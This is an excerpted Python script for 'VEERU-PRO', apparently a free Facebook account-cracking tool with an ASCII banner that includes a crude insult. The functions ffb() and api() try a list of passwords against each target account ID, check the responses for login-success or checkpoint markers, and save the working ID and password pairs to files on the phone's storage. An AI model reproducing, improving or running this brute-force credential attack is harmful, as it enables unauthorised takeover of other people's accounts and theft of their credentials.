...
logo=("""\033[1;37m
  . 『M』『a』『s』『h』『o』『o』『q』 『A』『l』『i』
     ...
     『M』『a』『s』『h』『o』『o』『q』 『A』『l』『i』   \033[1;34m𝐏 \033[1;37m
 『M』『a』『s』『h』『o』『o』『q』 『A』『l』『i』  ooo.\033[1;31m 𝐑\033[1;37m
  『M』『a』『s』『h』『o』『o』『q』 『A』『l』『i』 \033[1;35m𝐎 \033[1;37m
『M』『a』『s』『h』『o』『o』『q』 『A』『l』『i』 YP   YP YP   YD Y888888P VP   V8P  Y888P   
----------------------------------------------
 Author    : Mashooq Ali
 Github    : MASHOOQ ALI
 Facebook  : MASHOOQ ALI
 Tool Name : VEERU-PRO
 Type type : Free hai bro
 Version   : 0.1
----------------------------------------------
 MASHOOQ  Pro version 0.1
 For Haters: Paid sell karne waloun ki maa ki chhut 🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [Mashooq-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [Mashooq-OK] %s | %s'%(ids,pas))
                                open('/sdcard/Mashooq-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [Mashooq-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Mashooq-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [Mashooq-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Mashooq-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/Mashooq-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [Mashooq-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/Mashooq.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [Mashooq-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Mashooq-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
